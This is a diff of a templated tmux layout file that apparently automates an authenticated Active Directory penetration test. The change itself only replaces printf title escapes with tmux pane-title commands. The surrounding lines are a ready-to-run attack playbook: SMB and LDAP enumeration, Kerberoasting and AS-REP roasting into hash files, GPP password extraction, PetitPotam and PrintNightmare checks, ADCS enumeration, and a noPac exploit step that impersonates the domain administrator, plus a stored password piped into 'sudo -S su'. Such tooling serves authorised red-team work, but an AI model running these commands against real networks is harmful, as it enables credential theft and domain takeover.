@@ -23,64 +23,64 @@ windows:
   - SMB: 
       panes:
         - cme:
-          - printf '\033]2;%s\033\\' 'SMB shares'
+          - tmux select-pane -T 'SMB shares'
           - mkdir -p <%= @settings["rootDir"] %>/scans/Lists/smb; cd <%= @settings["rootDir"] %>/scans/Lists/smb
           - crackmapexec smb <%= @settings["rootDir"] %>/scans/Lists/smb.lst --shares -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' | tee RSM/scans/Lists/smb/cme-<%= @settings["user"] %>-shares.txt
         - smbmap:
-          - printf '\033]2;%s\033\\' 'smbmap'
+          - tmux select-pane -T 'smbmap'
           - <%= @settings["prefill"] %> "smbmap -H smbIP -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -R"; clear
         - dumpsterdiver:
-          - printf '\033]2;%s\033\\' 'dumpsterdiver'
+          - tmux select-pane -T 'dumpsterdiver'
           - cd /opt/nomad-tools && git clone https://github.com/securing/DumpsterDiver.git && cd DumpsterDiver && pipenv install
           - pipenv run python3 DumpsterDiver.py --help
   - LDAP: 
       panes:
         - ldapdomaindump:
-          - printf '\033]2;%s\033\\' 'ldapdomaindump'
+          - tmux select-pane -T 'ldapdomaindump'
           - mkdir <%= @settings["rootDir"] %>/ldap/domaindump && cd <%= @settings["rootDir"] %>/ldap/domaindump
           - ldapdomaindump -u '<%= @settings["domain"] %>\<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' `cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1`
         - getADusers:
-          - printf '\033]2;%s\033\\' 'getADusers'
+          - tmux select-pane -T 'getADusers'
           - GetADUsers.py -all '<%= @settings["domain"] %>/<%= @settings["user"] %>:<%= @settings["pass"] %>' -dc-ip `cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1` | tee <%= @settings["rootDir"] %>/ldap/getADUsers.txt
         - ldap signing:
-          - printf '\033]2;%s\033\\' 'ldap signing'
+          - tmux select-pane -T 'ldap signing'
           - cd /opt/nomad-tools/LdapRelayScan/
           - python3 LdapRelayScan.py -method BOTH -dc-ip $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>'
         - get user descriptions:
-          - printf '\033]2;%s\033\\' 'get user descriptions'
+          - tmux select-pane -T 'get user descriptions'
           - crackmapexec ldap `cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1` -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M get-desc-users
         - MAQ:
-          - printf '\033]2;%s\033\\' 'MAQ'
+          - tmux select-pane -T 'MAQ'
           - crackmapexec ldap `cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1` -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M MAQ
         - ldap-checker:
-          - printf '\033]2;%s\033\\' 'ldap-checker'
+          - tmux select-pane -T 'ldap-checker'
           - crackmapexec ldap `cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1` -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M ldap-checker
   - kerberoasting: 
       panes:
         - kerberoasting:
-          - printf '\033]2;%s\033\\' 'kerberoasting'
+          - tmux select-pane -T 'kerberoasting'
           - mkdir <%= @settings["rootDir"] %>/kerberoast
           - GetUserSPNs.py '<%= @settings["domain"] %>/<%= @settings["user"] %>:<%= @settings["pass"] %>' -dc-ip $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -request -outputfile <%= @settings["rootDir"] %>/kerberoast/kerberoasting.txt
         - delegation:
-          - printf '\033]2;%s\033\\' 'delegation'
+          - tmux select-pane -T 'delegation'
           - findDelegation.py '<%= @settings["domain"] %>/<%= @settings["user"] %>:<%= @settings["pass"] %>'
   - samTheAdmin: 
       panes:
         - check:
-          - printf '\033]2;%s\033\\' 'check'
+          - tmux select-pane -T 'check'
           - cd /opt/nomad-tools && git clone https://github.com/ly4k/Pachine.git; cd Pachine && pipenv install
           - pipenv shell
           - echo "test"
           - python3 -m pip install ldap3 impacket
           - python3 pachine.py -dc-host <%= @settings["domain"] %> -scan '<%= @settings["domain"] %>/<%= @settings["user"] %>:<%= @settings["pass"] %>'
         - exploit:
-          - printf '\033]2;%s\033\\' 'exploit'
+          - tmux select-pane -T 'exploit'
           - cd /opt/nomad-tools/
           - <%= @settings["prefill"] %> "cd Pachine; pipenv run python3 pachine.py -dc-host <%= @settings["domain"] %> -spn cifs/dc.<%= @settings["domain"] %> -impersonate administrator '<%= @settings["domain"] %>/<%= @settings["user"] %>:<%= @settings["pass"] %>'"; echo -e "\e[0;32mUpdate DC Netbios name\033[0m"
   - bloodhound: 
       panes:
         - bloodhound:
-          - printf '\033]2;%s\033\\' 'bloodhound'
+          - tmux select-pane -T 'bloodhound'
           - cd /opt/nomad-tools/
           - git clone https://github.com/fox-it/BloodHound.py.git
           - cd BloodHound.py
@@ -88,21 +88,21 @@ windows:
   - ADCS: 
       panes:
         - cme ADCS:
-          - printf '\033]2;%s\033\\' 'cme ADCS'
+          - tmux select-pane -T 'cme ADCS'
           - crackmapexec ldap `cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1` -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M adcs
         - certipy:
-          - printf '\033]2;%s\033\\' 'certipy'
+          - tmux select-pane -T 'certipy'
           - mkdir <%= @settings["rootDir"] %>/certipy
           - certipy find -u '<%= @settings["user"] %>@<%= @settings["domain"] %>' -p '<%= @settings["pass"] %>' -dc-ip `cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1` -old-bloodhound -scheme ldap | tee <%= @settings["rootDir"] %>/certipy/certipy.txt
   - PetitPotam: 
       panes:
         - PetitPotam:
-          - printf '\033]2;%s\033\\' 'PetitPotam'
+          - tmux select-pane -T 'PetitPotam'
           - crackmapexec smb `cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1` -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M petitpotam | tee petitpotam.txt
   - misc: 
       panes:
         - printNightmare:
-          - printf '\033]2;%s\033\\' 'printNightmare'
+          - tmux select-pane -T 'printNightmare'
           - crackmapexec smb <%= @settings["rootDir"] %>/scans/Lists/smb.lst -M spooler
           - echo <%= @settings['nomadPass'] %> | sudo -S su 
           # install and enable docker
@@ -113,9 +113,9 @@ windows:
           # create docker container to test printerNightmare
           - for i in `cat <%= @settings["rootDir"] %>/scans/Lists/rpcHosts-cleaned.txt`; do echo testing:$i; sudo docker run -it itwasalladream -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> $i; echo ""; done
         - GPP password:
-          - printf '\033]2;%s\033\\' 'GPP password'
+          - tmux select-pane -T 'GPP password'
           - crackmapexec smb `cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1` -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M gpp_password
         - authd ASREProast:
-          - printf '\033]2;%s\033\\' 'authd ASREP roast'
+          - tmux select-pane -T 'authd ASREP roast'
           - <%= @settings["prefill"] %> 'GetNPUsers.py <%= @settings["domain"] %>/ -dc-ip $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -no-pass -usersfile $USERFILENAME -outputfile <%= @settings["rootDir"] %>/scans/authd-asrepRoast.txt -format john'; clear
 
